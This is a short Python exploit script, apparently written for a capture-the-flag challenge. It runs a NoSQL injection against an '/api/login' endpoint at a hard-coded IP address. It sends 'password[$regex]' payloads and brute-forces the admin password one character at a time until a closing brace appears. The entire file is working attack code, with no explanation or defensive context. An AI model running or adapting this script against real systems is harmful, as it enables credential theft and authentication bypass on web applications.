#!/usr/bin/python3

import requests
import string

URL="http://138.68.168.137:32634"

def guess_admin_password():
	password=""
	headers = {'Content-type': 'application/x-www-form-urlencoded;charset=UTF-8'}
	print("Starting...")
	for i in range(100): #maximun password lenth = 100
		for c in string.ascii_uppercase + string.ascii_lowercase + string.digits + '{_}':
			payload=f"username=admin&password[$regex]=^{password}{c}"
			r = requests.post(URL + "/api/login", data=payload, headers=headers)

			if "Successful" in r.text:
				password+=c
				print(password)
				if '}' in password:
					return
				break

guess_admin_password()